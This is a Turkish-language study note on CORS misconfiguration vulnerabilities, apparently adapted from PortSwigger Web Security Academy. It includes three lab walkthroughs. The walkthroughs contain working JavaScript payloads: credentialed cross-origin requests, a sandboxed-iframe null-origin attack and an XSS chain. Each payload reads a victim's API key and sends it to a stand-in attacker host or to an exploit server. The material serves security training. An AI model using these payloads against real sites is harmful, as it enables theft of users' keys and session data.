---
{"dg-publish":true,"permalink":"/portswigger/cors/","created":"2025-06-02T16:32:46.035+03:00","updated":"2025-06-07T19:07:30.913+03:00"}
---


# Cross-origin resource sharing (CORS)

Bu bölümde, cross -origin resource sharing'in (CORS) ne olduğunu açıklayacak, cross-origin resource sharing tabanlı saldırıların bazı yaygın örneklerini tanımlayacak ve bu saldırılara karşı nasıl korunacağımızı tartışacağız. Bu konu, Bitcoins ve ödüller için CORS kusurlu yapılandırmalarını [Exploiting sunumu](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) ile bu saldırı sınıfını popüler hale getiren PortSwigger Research ile işbirliği içinde yazılmıştır.

## What is CORS (cross-origin resource sharing)?

Cross-origin resource sharing (CORS), belirli bir domain dışında bulunan resource'lara kontrollü erişim sağlayan bir tarayıcı mekanizmasıdır. Same -origin politikasını (SOP) genişletir ve ona esneklik katar. Bununla birlikte, bir web sitesinin CORS politikası kötü yapılandırılmış ve uygulanmışsa, cross-domain saldırıları için de potansiyel sağlar. CORS, cross-site request forgery (CSRF) gibi cross-origin saldırılarına karşı bir koruma değildir.

![Pasted image 20250602163530.png](/img/user/resimler/Pasted%20image%2020250602163530.png)

## Same-origin policy

Same-origin politikası, bir web sitesinin kaynak domaini dışındaki kaynaklarla etkileşime girme yeteneğini sınırlayan kısıtlayıcı bir cross-origin spesifikasyonudur. Same-origin politikası, bir web sitesinin diğerinden özel verileri çalması gibi potansiyel olarak kötü niyetli cross-domain etkileşimlerine yanıt olarak yıllar önce tanımlanmıştır. Genellikle bir domainin diğer domainlere request göndermesine izin verir, ancak response'lere erişmesine izin vermez.

## Same-origin politikasının gevşetilmesi

Same-origin politikası çok kısıtlayıcıdır ve sonuç olarak kısıtlamaları aşmak için çeşitli yaklaşımlar geliştirilmiştir. Birçok web sitesi, full cross-origin erişim gerektirecek şekilde subdomainler veya third-party sitelerle etkileşim halindedir. Same-origin politikasının kontrollü bir şekilde gevşetilmesi, cross-origin resource sharing (CORS) kullanılarak mümkündür.

## Vulnerabilities arising from CORS configuration issues

Birçok modern web sitesi, subdomain'lerden ve güvenilir üçüncü taraflardan erişime izin vermek için CORS kullanır. CORS uygulamaları hatalar içerebilir veya her şeyin çalıştığından emin olmak için aşırı hoşgörülü olabilir ve bu da istismar edilebilir güvenlik açıklarına neden olabilir.

### Client tarafından belirtilen Origin header'ından server tarafından oluşturulan ACAO header'ı

Bazı uygulamaların bir dizi başka domain'e erişim sağlaması gerekir. İzin verilen domainlerin bir listesini tutmak sürekli çaba gerektirir ve herhangi bir hata işlevselliği bozma riski taşır. Bu nedenle bazı uygulamalar, diğer tüm domainlerden erişime etkin bir şekilde izin vermenin kolay yolunu seçer.

Bunu yapmanın bir yolu, request'lerden Origin header'ını okumak ve request eden origin'e izin verildiğini belirten bir response header'ı eklemektir. Örneğin, aşağıdaki request'i alan bir uygulamayı düşünün:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Daha sonra cevap verir:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Bu header'lar, request'de bulunan domain'den (`malicious-website.com`) erişime izin verildiğini ve cross-origin request'lerin cookie (`Access-Control-Allow-Credentials: true`) içerebileceğini ve dolayısıyla session içinde işleneceğini belirtir.

Uygulama, `Access-Control-Allow-Origin` header'ında keyfi originler yansıttığından, bu, kesinlikle herhangi bir domain'in savunmasız domain'den kaynaklara erişebileceği anlamına gelir. Respon,e API key veya CSRF token gibi hassas bilgiler içeriyorsa, web sitenize aşağıdaki script'i yerleştirerek bu bilgileri alabilirsiniz:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

---

# Lab: CORS vulnerability with basic origin reflection

Bu web sitesi, tüm originlere güvendiği için güvenli olmayan bir CORS yapılandırmasına sahiptir.

Laboratuvarı çözmek için, adminin API anahtarını almak üzere CORS kullanan bir JavaScript oluşturun ve kodu exploit sunucunuza yükleyin. Admin'in API anahtarını başarıyla gönderdiğinizde laboratuvar çözülmüş olur.

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`

1- Kesmenin kapalı olduğunu kontrol edin, ardından oturum açmak ve hesap sayfanıza erişmek için tarayıcıyı kullanın.

2- Geçmişi inceleyin ve Anahtarınızın `/accountDetails` adresine yapılan bir AJAX request'i aracılığıyla alındığını ve yanıtın CORS'u destekleyebileceğini düşündüren `Access-Control-Allow-Credentials` header'ını içerdiğini gözlemleyin.

![Pasted image 20250602220632.png](/img/user/resimler/Pasted%20image%2020250602220632.png)

3- İsteği Burp Repeater'a gönderin ve eklenen headerla birlikte yeniden gönderin:

```
Origin: https://example.com
```

![Pasted image 20250602220812.png](/img/user/resimler/Pasted%20image%2020250602220812.png)

4- Origin'in `Access-Control-Allow-Origin` header'ında yansıtıldığını gözlemleyin.

5- Tarayıcıda, exploit server'a gidin ve `YOUR-LAB-ID` yerine benzersiz laboratuvar URL'nizi yazarak aşağıdaki HTML'yi girin:

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','http://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

6- Exploit'i görüntüle'ye tıklayın. Exploit'in çalıştığını gözlemleyin - log sayfasına ulaştınız ve API anahtarınız URL'de yer alıyor.

![Pasted image 20250602223402.png](/img/user/resimler/Pasted%20image%2020250602223402.png)

7- Exploit sunucusuna geri dönün ve Deliver exploit to victim  seçeneğine tıklayın.

8- Access log'a tıklayın, laboratuvarı tamamlamak için kurbanın API anahtarını alın ve gönderin.

---

### Errors parsing Origin headers

Birden fazla originden erişimi destekleyen bazı uygulamalar, bunu izin verilen originlerden oluşan bir whitelist kullanarak yapar. Bir CORS request'i alındığında, sağlanan kaynak whitelist ile karşılaştırılır. Origin whitelist'te görünüyorsa, `Access-Control-Allow-Origin` header'ına yansıtılır, böylece erişim izni verilir. Örneğin, uygulama aşağıdaki gibi normal bir istek alır:

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

Uygulama, sağlanan origini izin verilen originler listesine göre kontrol eder ve listede yer alıyorsa origini aşağıdaki gibi yansıtır:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

CORS origin whitelist'leri uygulanırken sıklıkla hatalar ortaya çıkar. Bazı kuruluşlar tüm subdomainlerinden (henüz mevcut olmayan gelecekteki subdomainler dahil) erişime izin vermeye karar verir. Bazı uygulamalar ise subdomain'leri de dahil olmak üzere çeşitli diğer kuruluşların domain'lerinden erişime izin verir. Bu kurallar genellikle URL prefixleri veya suffixleri eşleştirilerek veya düzenli ifadeler kullanılarak uygulanır. Uygulamadaki herhangi bir hata, istenmeyen harici domainlere erişim izni verilmesine yol açabilir.

Örneğin, bir uygulamanın şu şekilde biten tüm domainlere erişim izni verdiğini varsayalım:

```
normal-website.com
```

Bir saldırgan domain'i kaydederek erişim sağlayabilir:

```
hackersnormal-website.com
```

Alternatif olarak, bir uygulamanın aşağıdakilerle başlayan tüm domainlere erişim izni verdiğini varsayalım

```
normal-website.com
```

Bir saldırgan domaini kullanarak erişim sağlayabilir:

```
normal-website.com.evil-user.net
```

### Whitelisted null origin value

Origin header'ının belirtimi `null` değerini destekler. Tarayıcılar, çeşitli olağandışı durumlarda Origin header'ında `null` değerini gönderebilir:

* Cross-origin yönlendirmeleri.
* Serialized data'dan gelen requestler.
* `file:` protokolünü kullanarak istekte bulunma.
* Sandboxed cross-origin requests.

Bazı uygulamalar, uygulamanın local gelişimini desteklemek için `null` origini whitelist yapabilir. Örneğin, bir uygulamanın aşağıdaki cross-origin isteğini aldığını varsayalım:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

Ve server şöyle response verir:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Bu durumda, bir saldırgan Origin header'ında `null` değerini içeren bir cross-origin request oluşturmak için çeşitli trickler kullanabilir. Bu, whitelist'i tatmin edecek ve domainler arası erişime yol açacaktır. Örneğin, bu, formun sandbox'lanmış bir `iframe` cross-origin isteği kullanılarak yapılabilir:

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

---

# Lab: CORS vulnerability with trusted null origin

Bu web sitesi, “null” origine güvendiği için güvensiz bir CORS yapılandırmasına sahiptir.

Laboratuvarı çözmek için, adminin API anahtarını almak üzere CORS kullanan bir JavaScript oluşturun ve kodu exploit server'ınıza yükleyin. Admin'in API anahtarını başarıyla gönderdiğinizde laboratuvar çözülmüş olur.

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`

1- Intercept'in kapalı olduğunu kontrol edin, ardından hesabınıza giriş yapmak için Burp'ün tarayıcısını kullanın. “Hesabım ”a tıklayın.

2- History'yi inceleyin ve anahtarınızın `/accountDetails` adresine yapılan bir AJAX isteği aracılığıyla alındığını ve yanıtın CORS'u destekleyebileceğini düşündüren `Access-Control-Allow-Credentials` header'ını içerdiğini gözlemleyin.

![Pasted image 20250603002146.png](/img/user/resimler/Pasted%20image%2020250603002146.png)

3-  İsteği Burp Repeater'a gönderin ve `Origin: null` header'ını ekleyerek yeniden gönderin.

![Pasted image 20250603002206.png](/img/user/resimler/Pasted%20image%2020250603002206.png)

4- “`null`” origin'in `Access-Control-Allow-Origin` header'ında yansıtıldığını gözlemleyin.

5- Tarayıcıda, exploit sunucusuna gidin ve aşağıdaki HTML'yi girin, `YOUR-LAB-ID` yerine benzersiz laboratuvar URL'nizi ve `YOUR-EXPLOIT-SERVER-ID` yerine exploit sunucu kimliğini yazın:

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

6- Bu bir `null` origin isteği oluşturduğundan bir iframe sandbox kullanımına dikkat edin.

7- “ View exploit” seçeneğine tıklayın. Exploit'in çalıştığını gözlemleyin - log sayfasına geldiniz ve API anahtarınız URL'de yer alıyor.

![Pasted image 20250603002409.png](/img/user/resimler/Pasted%20image%2020250603002409.png)

![Pasted image 20250603002358.png](/img/user/resimler/Pasted%20image%2020250603002358.png)

![Pasted image 20250603002417.png](/img/user/resimler/Pasted%20image%2020250603002417.png)

8- Exploit sunucusuna geri dönün ve “ Deliver exploit to victim” (Exploit'i kurbana teslim et) seçeneğine tıklayın.

9- “ Access log ”a tıklayın, laboratuvarı tamamlamak için kurbanın API anahtarını alın ve gönderin.

---

### CORS güven ilişkileri aracılığıyla XSS'den yararlanma

“Doğru” yapılandırılmış CORS bile iki origin arasında bir trust ilişkisi kurar. Bir web sitesi, cross-site scripting'e (XSS) karşı savunmasız olan bir kaynağa güveniyorsa, bir saldırgan, savunmasız uygulamaya güvenen siteden hassas bilgileri almak için CORS'u kullanan bazı JavaScript'leri enjekte etmek için XSS'den yararlanabilir.

“Doğru” yapılandırılmış CORS bile iki origin arasında bir trust ilişkisi kurar. Bir web sitesi, cross-site scripting'e (XSS) karşı savunmasız olan bir origine güveniyorsa, bir saldırgan, savunmasız uygulamaya güvenen siteden hassas bilgileri almak için CORS'u kullanan bazı JavaScript'leri enjekte etmek için XSS'den yararlanabilir.

Aşağıdaki istek göz önüne alındığında:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Sunucu şu şekilde yanıt verirse:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Daha sonra `subdomain.vulnerable-website.com` adresinde bir XSS açığı bulan bir saldırgan, aşağıdaki gibi bir URL kullanarak API anahtarını almak için bunu kullanabilir:

```http
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```


### Kötü yapılandırılmış CORS ile TLS'yi kırma

HTTPS'yi titizlikle kullanan bir uygulamanın, düz HTTP kullanan güvenilir bir subdomain'i de whitelist yaptığını varsayalım. Örneğin, uygulama aşağıdaki isteği aldığında:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Uygulama şu şekilde yanıt verir:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Bu durumda, kurban kullanıcının trafiğine müdahale edebilecek konumda olan bir saldırgan, kurbanın uygulama ile etkileşimini tehlikeye atmak için CORS yapılandırmasından yararlanabilir. Bu saldırı aşağıdaki adımları içerir:

* Kurban kullanıcı herhangi bir düz HTTP isteği yapar.
* Saldırgan bir yeniden yönlendirme enjekte eder:

```http
http://trusted-subdomain.vulnerable-website.com
```

* Kurbanın tarayıcısı yönlendirmeyi takip eder.
* Saldırgan düz HTTP isteğini keser ve CORS isteği içeren sahte bir yanıt döndürür:

```
https://vulnerable-website.com
```

* Kurbanın tarayıcısı, origin de dahil olmak üzere CORS isteğini yapar:

```
http://trusted-subdomain.vulnerable-website.com
```

* Uygulama, bu whitelist'e sahip bir origin olduğu için isteğe izin verir. İstenen hassas veriler yanıt olarak döndürülür.
* Saldırganın sahte sayfası hassas verileri okuyabilir ve saldırganın kontrolü altındaki herhangi bir domain'e iletebilir.

Bu saldırı, savunmasız web sitesi HTTPS kullanımında başka türlü sağlam olsa, HTTP endpoint'i olmasa ve tüm cookies'ler güvenli olarak işaretlenmiş olsa bile etkilidir.

---

# Lab: CORS vulnerability with trusted insecure protocols

Bu web sitesi, protokolden bağımsız olarak tüm subdomain'lere güvenen güvensiz bir CORS yapılandırmasına sahiptir.

Laboratuvarı çözmek için, adminin API anahtarını almak üzere CORS kullanan bir JavaScript oluşturun ve kodu exploit sunucunuza yükleyin. Admin'in API anahtarını başarıyla gönderdiğinizde laboratuvar çözülmüş olur.

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`

Kurbana ortadaki adam saldırısı (MITM) yapabilseydiniz, güvenli olmayan bir subdomain'e bağlantıyı ele geçirmek için bir MITM saldırısı kullanabilir ve CORS yapılandırmasından yararlanmak için kötü amaçlı JavaScript enjekte edebilirsiniz. Maalesef laboratuvar ortamında kurbanı MITM'leyemezsiniz, bu nedenle subdomain'e JavaScript enjekte etmek için alternatif bir yol bulmanız gerekir.

1- Intercept'in kapalı olduğunu kontrol edin, ardından oturum açmak ve hesap sayfanıza erişmek için Burp'ün tarayıcısını kullanın.

2-  History'yi inceleyin ve anahtarınızın `/accountDetails` adresine yapılan bir `AJAX` isteği aracılığıyla alındığını ve yanıtın CORS'u destekleyebileceğini düşündüren `Access-Control-Allow-Credentials` header'ını içerdiğini gözlemleyin.

![Pasted image 20250603011744.png](/img/user/resimler/Pasted%20image%2020250603011744.png)

3- Request'i Burp Repeater'a gönderin ve eklenen Header `Origin: http://subdomain.lab-id` ile yeniden gönderin; burada lab-id laboratuvar domain adıdır.

![Pasted image 20250603011827.png](/img/user/resimler/Pasted%20image%2020250603011827.png)

4- Originin `Access-Control-Allow-Origin` header'ında yansıtıldığını gözlemleyin ve CORS yapılandırmasının hem HTTPS hem de HTTP olmak üzere rastgele subdomain'lerden erişime izin verdiğini doğrulayın.

![Pasted image 20250603011855.png](/img/user/resimler/Pasted%20image%2020250603011855.png)

5- Bir product sayfası açın, Check stock'a tıklayın ve bir subdomain üzerinde bir HTTP URL'si kullanılarak yüklendiğini gözlemleyin.

6- `productID` parametresinin XSS'ye karşı savunmasız olduğunu gözlemleyin.

![Pasted image 20250603012517.png](/img/user/resimler/Pasted%20image%2020250603012517.png)

![Pasted image 20250603012549.png](/img/user/resimler/Pasted%20image%2020250603012549.png)

7- Tarayıcıda, exploit sunucusuna gidin ve `YOUR-LAB-ID` yerine benzersiz laboratuvar URL'nizi ve `YOUR-EXPLOIT-SERVER-ID` yerine exploit sunucu kimliğinizi yazarak aşağıdaki HTML'yi girin:

```js
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

![Pasted image 20250603012711.png](/img/user/resimler/Pasted%20image%2020250603012711.png)

8- `View exploit`'e tıklayın. Exploit'in çalıştığını gözlemleyin - log sayfasına ulaştınız ve API anahtarınız URL'de yer alıyor.

![Pasted image 20250603012728.png](/img/user/resimler/Pasted%20image%2020250603012728.png)

9- Exploit sunucusuna geri dönün ve `Deliver exploit to victim` (Exploit'i kurbana teslim et) seçeneğine tıklayın.

![Pasted image 20250603012751.png](/img/user/resimler/Pasted%20image%2020250603012751.png)

![Pasted image 20250603012809.png](/img/user/resimler/Pasted%20image%2020250603012809.png)

10- `Access log`'a tıklayın, laboratuvarı tamamlamak için kurbanın API anahtarını alın ve gönderin.